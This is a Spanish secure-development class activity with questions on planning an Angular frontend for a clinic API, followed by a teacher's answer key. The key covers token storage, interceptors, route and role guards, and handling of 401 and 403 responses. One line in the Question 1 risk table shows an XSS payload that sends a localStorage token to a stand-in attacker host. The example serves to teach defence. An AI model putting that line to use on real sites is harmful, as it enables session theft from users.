# Actividad: Planificando el Frontend Seguro en Angular

> **Módulo:** Desarrollo Seguro Avanzado
> **Modalidad:** Individual + Grupal
> **Tiempo:** 40 a 60 minutos
> **Nivel:** Intermedio – Avanzado

---

## Contexto para el estudiante

Durante las últimas semanas construimos una API RESTful con NestJS para la
gestión de una clínica médica. Antes de comenzar a codificar el frontend,
necesitamos planificarlo — especialmente en lo que respecta a seguridad.

Lo que ya está implementado en el backend:

- **JWT** — Access Token de 15 min + Refresh Token rotativo en cookie HttpOnly.
- **Passwords** — Hasheadas con Argon2id — resistente a ataques de GPU y side-channel.
- **Roles** — Control de acceso por rol: `admin`, `doctor`, `patient`.
- **Rate Limiting** — Diferenciado por endpoint — previene ataques de fuerza bruta.
- **Guard Global** — Todos los endpoints privados por defecto — públicos se marcan con `@Public()`.

## Objetivo

Esta actividad **no tiene respuestas incorrectas**. El objetivo es explorar tu
punto de vista actual: qué sabes, qué intuyes, qué dudas tienes. Responde con
lo que realmente harías — aunque no estés seguro.

---

## Preguntas

### Área 1 — Autenticación y manejo de tokens

**1.** La API devuelve un `accessToken` en el body del login y guarda el
`refreshToken` en una cookie `HttpOnly`. ¿Dónde guardarías el `accessToken` en
Angular?

→ ¿`localStorage`, `sessionStorage`, una cookie, o en memoria dentro de un servicio?
→ ¿Qué riesgo tiene cada opción?
→ ¿Qué pasa con el token si el usuario cierra el navegador?

---

**2.** El `accessToken` expira en 15 minutos. ¿Qué haría tu aplicación Angular
cuando una petición recibe un `401` por token expirado?

→ ¿El usuario tendría que hacer login nuevamente cada 15 minutos?
→ ¿Cómo renovarías el token de forma automática sin interrumpir la sesión?
→ ¿En qué momento exacto detectarías que el token expiró?

---

### Área 2 — Protección de rutas

**3.** Tu aplicación tiene las rutas `/dashboard`, `/admin/usuarios` y `/perfil`.
¿Cómo impedirías que un usuario no autenticado acceda directamente escribiendo
la URL en el navegador?

→ ¿Qué mecanismo de Angular usarías?
→ ¿Qué pasa si el usuario borra el token manualmente y recarga la página?

---

**4.** La API maneja tres roles: `admin`, `doctor` y `patient`. Un `patient` no
debería ver `/admin/usuarios`. ¿Cómo lo controlarías en Angular?

→ ¿Confiarías únicamente en que el backend rechazará las peticiones?
→ ¿Qué valor tiene proteger la ruta en el frontend si el backend ya rechaza la petición?
→ ¿Dónde guardarías el rol del usuario para hacer esa verificación?

---

### Área 3 — Comunicación con la API

**5.** Tienes diez servicios Angular (`UsuariosService`, `PacientesService`,
`CitasService`, etc.) y todos necesitan enviar el header
`Authorization: Bearer <token>` en cada petición.

→ ¿Copiarías ese código en cada uno de los diez servicios?
→ ¿Existe algún mecanismo en Angular para centralizar eso en un solo lugar?
→ ¿Qué pasaría si mañana el nombre del header cambia? ¿Cuántos archivos tendrías que tocar?

---

**6.** La API puede devolver `401 Unauthorized` (token expirado o inválido) y
`403 Forbidden` (autenticado pero sin permiso). ¿Los manejarías de la misma
forma en Angular?

→ ¿Qué debería hacer la aplicación ante un `401`?
→ ¿Qué debería hacer ante un `403`?
→ ¿Los mostrarías al usuario de la misma manera?

---

### Área 4 — Validación en el frontend

**7.** El backend ya valida todos los datos con `ValidationPipe`. ¿Tiene
sentido validar también en el formulario Angular?

→ ¿Para qué sirve la validación en el frontend si el backend ya la hace?
→ ¿Qué pasaría si desactivas la validación del frontend — qué cambia para el usuario?
→ ¿Podría la validación del frontend reemplazar la del backend? ¿Por qué?

---

### Área 5 — Exposición de información sensible

**8.** Compara estos dos escenarios de respuesta ante un login fallido. ¿Cuál
implementarías y por qué?

| Escenario A — Mensajes específicos | Escenario B — Mensaje genérico |
|---|---|
| `"El email ingresado no está registrado en el sistema"` | `"Credenciales inválidas. Verifica tu email y contraseña."` |
| `"La contraseña ingresada es incorrecta"` | (un único mensaje para ambos casos) |

→ ¿Cuál le da mejor experiencia al usuario?
→ ¿Cuál le da más información a un atacante?
→ ¿Cómo equilibrarías seguridad y usabilidad?

---

> No hay respuestas incorrectas hoy.
> Lo que reflexiones aquí es el punto de partida para construir juntos el
> frontend seguro en Angular.

---

---

```
╔══════════════════════════════════════════════════════════════════════════════╗
║                         GUÍA DEL PROFESOR                                    ║
║              No proyectar esta sección durante la actividad                  ║
║         Imprimir por separado o abrir en una ventana diferente               ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

---

## Respuestas correctas — para uso del profesor

---

### Pregunta 1 — Dónde guardar el `accessToken` en Angular

**Dónde se guarda:** en **memoria**, dentro de una propiedad privada de un
servicio Angular (`AuthService`) — típicamente como `BehaviorSubject<string | null>`
o como propiedad simple. **No** se guarda en `localStorage`, **no** en
`sessionStorage`, **no** en una cookie accesible desde JavaScript.

**Riesgos de cada opción:**

| Opción | Riesgo |
|---|---|
| `localStorage` | Accesible para cualquier script JS de la página. Una sola línea de XSS roba el token: `fetch('https://atacante.com/steal?t=' + localStorage.getItem('token'))`. Persiste entre pestañas y reinicios — un robo equivale a una sesión completa. |
| `sessionStorage` | Mismo problema que `localStorage` frente a XSS. Solo cambia que se borra al cerrar la pestaña — no es una mejora de seguridad real, solo de duración. |
| Cookie no-`HttpOnly` | Igualmente accesible vía `document.cookie` desde JavaScript. Si no es `HttpOnly`, no aporta seguridad extra frente a `localStorage`. |
| Cookie `HttpOnly` | Sería seguro frente a XSS, pero se envía automáticamente en cada petición a su dominio — sin control por parte de Angular. Para el access token preferimos control explícito; la cookie HttpOnly se usa solo para el refresh token. |
| **Memoria (servicio)** | **No accesible desde scripts externos ni desde DevTools como variable de aplicación. XSS tendría que ejecutarse dentro del contexto de Angular para alcanzarla — significativamente más difícil que `localStorage.getItem()`.** |

**Qué pasa si el usuario cierra el navegador:** el token en memoria se
pierde — eso es **deseable**. Al reabrir la aplicación, Angular llama
silenciosamente a `POST /auth/refresh`. La cookie `HttpOnly` con el refresh
token (que sí persiste en el navegador) se envía automáticamente, el backend
emite un nuevo access token, y la sesión se restaura sin que el usuario tenga
que volver a introducir credenciales. Lo mejor de los dos mundos: el access
token vulnerable solo vive en memoria, y la persistencia la aporta una cookie
que JavaScript no puede leer.

> **OWASP A02:2025** — Cryptographic Failures: almacenar tokens de sesión en
> ubicaciones inseguras (`localStorage`, `sessionStorage`, cookies no-HttpOnly)
> expone credenciales criptográficas.
> **OWASP A03:2025** — Injection / XSS: `localStorage` amplifica el impacto
> de cualquier XSS porque convierte una ejecución de código en un robo de
> sesión persistente.
> **Concepto Angular:** `AuthService` con `private token$ = new BehaviorSubject<string | null>(null)`.
> Los componentes consumen el observable; el valor nunca toca el DOM ni el
> almacenamiento del navegador.

---

### Pregunta 2 — Renovación silenciosa cuando el access token expira

**¿El usuario tendría que hacer login cada 15 minutos?** No, jamás. Sería una
experiencia de usuario inaceptable: en una jornada laboral de 8 horas serían
32 logins. La renovación tiene que ser **transparente para el usuario** — no
debe ver ningún mensaje, ninguna pantalla intermedia, ninguna interrupción.

**Cómo renovar el token automáticamente:** mediante un **`HttpInterceptor`**
que intercepta las respuestas `401` antes de que lleguen al componente que
hizo la petición. El flujo:

1. La aplicación hace una petición normal a la API (ej: `GET /citas`).
2. El backend responde `401` porque el access token expiró.
3. El interceptor captura ese `401` antes de que el componente lo vea.
4. El interceptor llama a `POST /auth/refresh` — la cookie `HttpOnly` con el
   refresh token se envía automáticamente.
5. El backend responde con un nuevo access token.
6. El interceptor actualiza el `AuthService` con el nuevo token.
7. El interceptor **reintenta la petición original** (el `GET /citas`) con
   el token nuevo.
8. El componente recibe la respuesta exitosa — nunca supo que hubo un 401.

Si en algún momento el refresh también falla (porque expiró a los 7 días, o
porque el usuario fue desactivado, o porque se detectó reuso), entonces sí
se redirige al usuario a `/login`.

**Detalle técnico crítico:** durante la renovación pueden llegar varias
peticiones paralelas que también fallen con 401. El interceptor debe
**serializar** los reintentos — la primera petición dispara el refresh, las
demás esperan en una cola hasta que el nuevo token esté disponible. Sin esto,
la aplicación dispararía N llamadas concurrentes a `/auth/refresh` y se
producirían condiciones de carrera.

**¿En qué momento exacto se detecta la expiración?** En el momento en que
la **siguiente petición autenticada falla con 401**. No se intenta predecir
la expiración mirando el `exp` del token — eso obligaría a sincronizar
relojes con el servidor y abriría problemas de drift. La fuente de verdad
es la respuesta del backend.

> **OWASP A07:2025** — Identification and Authentication Failures: gestionar
> mal la expiración fuerza a usar tokens de vida muy larga, lo cual aumenta
> la ventana de exposición ante un robo.
> **Concepto Angular:** `HttpInterceptor` con `catchError` + `switchMap` al
> observable de refresh + flag `isRefreshing` y un `Subject` de cola para
> serializar reintentos concurrentes.

---

### Pregunta 3 — Impedir acceso a rutas protegidas sin autenticación

**Mecanismo de Angular:** un **`AuthGuard`** — concretamente una función
`CanActivateFn` registrada en la configuración de rutas. El guard se ejecuta
**antes de que el componente se instancie**, comprueba si hay un access
token activo en `AuthService`, y:

- Si lo hay → permite el acceso (`return true`).
- Si no lo hay → redirige a `/login` (`router.navigate(['/login'])` y `return false`).

```typescript
// Ejemplo de configuración
{ path: 'dashboard', component: DashboardComponent, canActivate: [authGuard] }
```

El componente protegido **nunca se carga** si el guard rechaza. Esto es
distinto y mejor que poner un `if` en `ngOnInit`: con `ngOnInit` el componente
ya se renderizó por un instante y el usuario puede ver un destello de
contenido protegido antes de la redirección. El guard corta antes.

**¿Qué pasa si el usuario borra el token y recarga la página?**

Al recargar, la aplicación arranca en estado limpio: el `AuthService` no tiene
token en memoria (el token vivía solo en memoria). La aplicación intenta
silenciosamente un refresh:

1. Llama a `POST /auth/refresh` con la cookie `HttpOnly` que aún existe.
2. Si el refresh es válido → obtiene un nuevo access token → el guard pasa.
3. Si el refresh también falló o no existe → el guard redirige a `/login`.

El usuario no puede saltarse el control "borrando el token" — porque borrarlo
del frontend no afecta a la cookie `HttpOnly` (que JavaScript no puede ver
ni borrar), y aunque se la borrara también, el guard simplemente lo mandaría
al login. La autoridad real es el **backend**, no el cliente.

> **OWASP A01:2025** — Broken Access Control: el control de acceso debe
> denegar por defecto antes de cargar el recurso, no después de cargarlo.
> **Concepto Angular:** `CanActivateFn` registrado en `app.routes.ts`,
> `Router.navigate()` para redirigir, retorno booleano (o `UrlTree`) para
> autorizar.

---

### Pregunta 4 — Control por rol (`/admin/usuarios` solo para admin)

**¿Confiarías únicamente en que el backend rechazará?** No. Confiar **solo**
en el backend es incompleto, aunque el backend siga siendo la autoridad final.
La razón es que sin protección frontend:

- El paciente puede navegar a `/admin/usuarios`, ver el layout, los skeleton
  loaders, posiblemente nombres de campos y estructura de la pantalla.
- Las llamadas de esa pantalla devolverán `403`, pero el usuario ya vio la
  estructura interna.
- Es una mala experiencia de usuario y una filtración innecesaria de
  arquitectura.

La regla es **defense in depth**: el backend valida porque nunca confía en
el cliente; el frontend valida porque ofrece la mejor experiencia y no expone
estructura interna a usuarios sin permiso.

**Qué valor tiene proteger la ruta en el frontend si el backend ya la rechaza:**

1. **UX correcta** — el usuario sin permiso ve "Acceso denegado" inmediatamente,
   no una pantalla rota con loaders eternos.
2. **No filtrar estructura** — el HTML de pantallas administrativas no se
   sirve a usuarios sin rol.
3. **Reducir carga en el backend** — peticiones que de todas formas iban a
   fallar nunca se hacen.
4. **Mostrar/ocultar UI dinámica** — el rol también se usa para mostrar u
   ocultar botones, links, secciones del menú según permisos. Esa lógica
   vive en el frontend.

**Mecanismo concreto:** un **`RoleGuard`** parametrizable. La ruta declara
qué roles permite, y el guard lo comprueba contra el rol actual del
`AuthService`:

```typescript
{
  path: 'admin/usuarios',
  component: AdminUsuariosComponent,
  canActivate: [authGuard, roleGuard],
  data: { roles: ['admin'] }
}
```

Si el rol no coincide, el guard redirige a una página de "acceso denegado"
— **no** al login. El usuario ya está autenticado; mandarlo al login sería
incorrecto y confuso.

**Dónde guardar el rol del usuario:** en el mismo `AuthService` donde vive
el access token. El rol viene en el payload del JWT (claim `role`), o lo
devuelve el endpoint `/auth/login` en el body junto al token. El servicio
lo expone como observable (`role$: Observable<UserRole>`) y los componentes
y guards se suscriben.

**Crítico:** el rol del frontend es solo para UX. La autoridad sobre permisos
sigue siendo el backend — un usuario malicioso podría manipular el estado
del `AuthService` en DevTools, pero el backend rechazaría sus peticiones
con `403` igualmente. El frontend nunca otorga permisos; solo refleja los
que ya concedió el backend.

> **OWASP A01:2025** — Broken Access Control: la visibilidad de recursos
> también es control de acceso.
> **Concepto Angular:** `CanActivateFn` con `ActivatedRouteSnapshot.data.roles`,
> comparado con `authService.role()`.

---

### Pregunta 5 — Centralizar el header `Authorization`

**¿Copiarías el código en cada uno de los diez servicios?** No. Es duplicación
que viola DRY y es propensa a errores: si un desarrollador olvida añadir el
header en un servicio nuevo, esa petición sale sin token y falla con 401.
La seguridad nunca debe depender de que cada desarrollador recuerde aplicarla.

**Mecanismo de Angular para centralizar:** un **`HttpInterceptor`**. Un solo
archivo, registrado globalmente, intercepta **todas** las peticiones HTTP
salientes y añade el header `Authorization` automáticamente:

```typescript
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const token = inject(AuthService).getToken();

  if (token) {
    req = req.clone({
      setHeaders: { Authorization: `Bearer ${token}` }
    });
  }

  return next(req);
};
```

Registrado una sola vez en la configuración:

```typescript
provideHttpClient(withInterceptors([authInterceptor]))
```

Los diez servicios — y cualquier servicio futuro — heredan automáticamente
este comportamiento. No tienen que saber nada del token.

**Detalle:** los endpoints públicos (`/auth/login`, `/auth/register`,
`/auth/refresh`) no deben llevar el header. El interceptor puede verificar
la URL y omitir el header en esos casos, o el `AuthService` simplemente
devuelve `null` cuando no hay token y el `if (token)` se salta solo.

**Si mañana el nombre del header cambia (ejemplo: `X-Auth-Token`):** se
toca **un solo archivo** — el interceptor. Los diez servicios no se modifican.
Si el código estuviera duplicado en cada servicio, habría que tocar diez
archivos, hacer diez code reviews, y existiría riesgo real de que alguno
se quedara sin actualizar. El interceptor convierte un cambio potencialmente
peligroso en un cambio quirúrgico.

> **OWASP A04:2025** — Insecure Design: una arquitectura donde la seguridad
> depende de que cada desarrollador recuerde aplicarla es insegura por diseño.
> **Concepto Angular:** `HttpInterceptorFn`, `req.clone({ setHeaders: {...} })`,
> registro global con `provideHttpClient(withInterceptors([...]))`.

---

### Pregunta 6 — Manejo de `401` vs `403`

**¿Se manejan igual?** No. Son situaciones fundamentalmente distintas y
requieren respuestas distintas.

**`401 Unauthorized` — el servidor no sabe quién es el cliente.** El token
está ausente, expirado, mal formado o revocado. La aplicación debe:

1. Intentar **renovar silenciosamente** vía `/auth/refresh` (ver Pregunta 2).
2. Si el refresh tiene éxito → reintentar la petición original. El usuario
   no se entera de nada.
3. Si el refresh también falla → redirigir a `/login`.

**`403 Forbidden` — el servidor sí sabe quién es el cliente, pero ese usuario
no tiene permiso para ese recurso.** La aplicación debe:

1. **No** intentar renovar — el problema no es de autenticación.
2. **No** redirigir a login — el usuario ya está logueado correctamente.
3. Mostrar una página o mensaje de **"acceso denegado"**.
4. Opcionalmente, registrar el evento en un sistema de monitoreo (puede
   indicar un bug de UI que permitió pulsar un botón sin permiso).

**¿Se muestran al usuario de la misma manera?**

- Un **`401`** que se renueva silenciosamente **no se muestra al usuario en
  absoluto** — es transparente.
- Un **`401`** que falla en el refresh se muestra como pantalla de login con
  un mensaje suave: *"Tu sesión ha expirado, vuelve a iniciar sesión"*.
- Un **`403`** se muestra como pantalla o toast de **"No tienes permisos
  para acceder a este recurso"** — sin redirigir a login. El usuario sigue
  autenticado.

Confundir los dos casos genera un bug clásico: si la app trata `403` como
`401` y lo manda al login, el usuario hace login correctamente, vuelve a
la misma pantalla protegida, recibe otro `403`, lo manda al login otra vez
— bucle infinito que confunde y enfada al usuario.

> **OWASP A01:2025** — Broken Access Control + **A07:2025** — Authentication
> Failures.
> **Concepto Angular:** `HttpInterceptor` distinto para errores
> (`errorInterceptor`), con `switch` por `error.status`. Distinto del
> `authInterceptor` de la Pregunta 5 — separación de responsabilidades.

---

### Pregunta 7 — Validación frontend vs backend

**¿Tiene sentido validar en el formulario Angular si el backend ya valida?**
Sí, siempre. Las dos validaciones tienen **propósitos distintos** y son
complementarias, no redundantes.

**Para qué sirve la validación en el frontend:**

- **UX** — feedback inmediato al usuario sin esperar una ida al servidor.
  El campo se pone en rojo en cuanto el usuario sale de él, no después de
  pulsar "enviar" y esperar 200 ms.
- **Reducir tráfico inútil** — si el formato es claramente inválido (un
  email sin `@`), no hace falta consultar al servidor.
- **Guiar al usuario** — mensajes contextuales como "mínimo 8 caracteres",
  "debe contener una mayúscula", visibles mientras escribe.

**Para qué sirve la validación en el backend:**

- **Seguridad** — el servidor **nunca** debe confiar en el cliente. Un atacante
  puede saltarse la UI completamente y enviar peticiones directamente con
  `curl`, Postman o un script.
- **Integridad de datos** — solo el backend puede validar reglas que dependen
  de datos que el frontend no tiene (ej: "este email ya existe").

**¿Qué pasaría si desactivas la validación del frontend?**

Para el **usuario legítimo**: la experiencia empeora. El formulario se envía
con datos inválidos, el servidor responde con error, el usuario tiene que
corregir y reintentar. Más latencia, más fricción.

Para la **seguridad**: nada cambia. El servidor sigue rechazando los datos
inválidos y los maliciosos. Esto demuestra que la validación del frontend
es una capa de **experiencia**, no de seguridad.

**¿Podría la validación del frontend reemplazar a la del backend?**

**Nunca.** Bajo ninguna circunstancia. Hacerlo sería un fallo de diseño grave.
Razones:

1. El frontend se ejecuta en el navegador del usuario — un atacante controla
   ese entorno completamente. Puede modificar el código JavaScript en vivo,
   desactivar validadores, manipular el DOM.
2. El frontend puede ni siquiera ser nuestro frontend — un atacante puede
   construir su propio cliente que ignore todas nuestras reglas.
3. Cualquier herramienta CLI (`curl`, Postman, scripts de Python) puede
   enviar peticiones al backend sin pasar nunca por el frontend.

La validación del frontend es una **cortesía** para el usuario. La del
backend es una **obligación de seguridad**.

> **OWASP A04:2025** — Insecure Design: validar solo en cliente es
> arquitectura insegura por diseño.
> **Concepto Angular:** `ReactiveFormsModule` con `Validators.required`,
> `Validators.email`, `Validators.minLength`, validadores personalizados
> (`AbstractControl`), y `setErrors()` para inyectar errores que vienen del
> backend (ej: "este email ya existe").

---

### Pregunta 8 — Mensaje de login fallido: específico vs genérico

**Implementaría el Escenario B — mensaje genérico** (`"Credenciales inválidas.
Verifica tu email y contraseña."`).

**¿Cuál le da mejor experiencia al usuario?**

A primera vista parece que el Escenario A (mensajes específicos) es mejor,
porque le dice al usuario exactamente qué corregir. Pero el beneficio real
es marginal: en la práctica, el usuario suele saber si introdujo bien su
email — el problema casi siempre es la contraseña — y el mensaje genérico
le sugiere comprobar ambos. La fricción adicional para el usuario legítimo
es despreciable.

**¿Cuál le da más información a un atacante?**

El **Escenario A** le da una herramienta directa para **enumeración de
usuarios**:

- El atacante automatiza miles de intentos con emails distintos.
- Recibe `"Email no registrado"` → ese email **no existe** → lo descarta.
- Recibe `"Contraseña incorrecta"` → ese email **sí existe** → lo guarda.
- Termina con una lista de emails válidos del sistema.
- Lanza un ataque dirigido (credential stuffing, fuerza bruta) solo contra
  esos emails — mucho más eficiente que probar emails al azar.

Ataques históricos famosos (LinkedIn 2012, Adobe 2013) se vieron facilitados
por mensajes específicos en pantallas de login y de recuperación de contraseña.
Esto está documentado en OWASP como uno de los vectores más explotados.

**Cómo equilibrar seguridad y usabilidad:**

El Escenario B equilibra correctamente, y se puede mejorar con:

1. **Mensaje genérico** en la respuesta del servidor — `"Credenciales inválidas"`.
2. **Log interno detallado** en el backend — el equipo de seguridad sí ve
   "intento fallido para email X con contraseña incorrecta" en sus logs,
   sin exponer esa información al cliente.
3. **Rate limiting agresivo** en `/auth/login` — el backend ya lo hace
   (5 intentos/min/IP). Esto eleva el coste de un ataque automatizado
   independientemente del mensaje.
4. **Captcha tras N intentos fallidos** — opcional, dificulta automatización.
5. **Recuperación de contraseña con mensaje también genérico** — `"Si el
   email existe en nuestro sistema, recibirás un enlace de recuperación"`
   — incluso cuando el email no existe. Cierra el otro vector de
   enumeración por la puerta de atrás.

El backend de este proyecto ya implementa el Escenario B en
`LocalStrategy.validate()` con un único mensaje `"Credenciales inválidas"`
para todos los casos de fallo (email inexistente, contraseña incorrecta,
usuario desactivado). El frontend debe mostrar ese mensaje **tal cual** —
no descomponerlo, no "mejorarlo", no ser más específico.

> **OWASP A07:2025** — Identification and Authentication Failures: revelar
> si un email existe facilita enumeración de usuarios y ataques de
> credential stuffing.

---

## Conexión con el backend construido

Todo lo planteado en esta actividad tiene un equivalente directo en el
backend que ya existe. No estamos inventando soluciones nuevas — estamos
extendiendo las que ya funcionan:

| Backend — NestJS | Propósito | Frontend — Angular (a construir) |
|---|---|---|
| `JwtAuthGuard` global en `app.module.ts` | Proteger todos los endpoints por defecto | `AuthGuard` (`CanActivateFn`) en rutas + ruta catch-all |
| `LocalStrategy.validate()` en login | Verificar credenciales | `ReactiveFormsModule` con login form |
| Refresh token en cookie `HttpOnly` | Renovar sesión sin exponer JS | `HttpInterceptor` que llama `/auth/refresh` ante 401 |
| `ValidationPipe` con `whitelist: true` | Rechazar campos no permitidos en servidor | `ReactiveFormsModule` con validadores (complementario, no sustituto) |
| Mensajes genéricos en `UnauthorizedException` | No revelar detalles internos | Mostrar el mensaje del servidor sin descomponerlo |
| CORS con `credentials: true` | Permitir cookie del refresh | `HttpClient` con `{ withCredentials: true }` |
| Roles `admin` / `doctor` / `patient` en JWT | Autorización por rol en endpoints | `RoleGuard` que lee el rol del `AuthService` |
| `@Public()` en login/register/refresh | Endpoints sin token | Interceptor que omite `Authorization` en esas rutas |
| Rate limiting (`@Throttle`) | Frenar fuerza bruta en backend | UI que respeta los `429` con mensajes "intenta más tarde" |
| Blocklist Valkey + nulificación de refresh en logout | Invalidar sesiones activas | `AuthService.logout()` que llama al endpoint y limpia memoria |

---

> **No hay respuestas incorrectas hoy.**
> Lo que reflexiones aquí es el punto de partida para construir juntos el
> frontend seguro en Angular.

**Kibernum IT Academy — Desarrollo Seguro Avanzado**
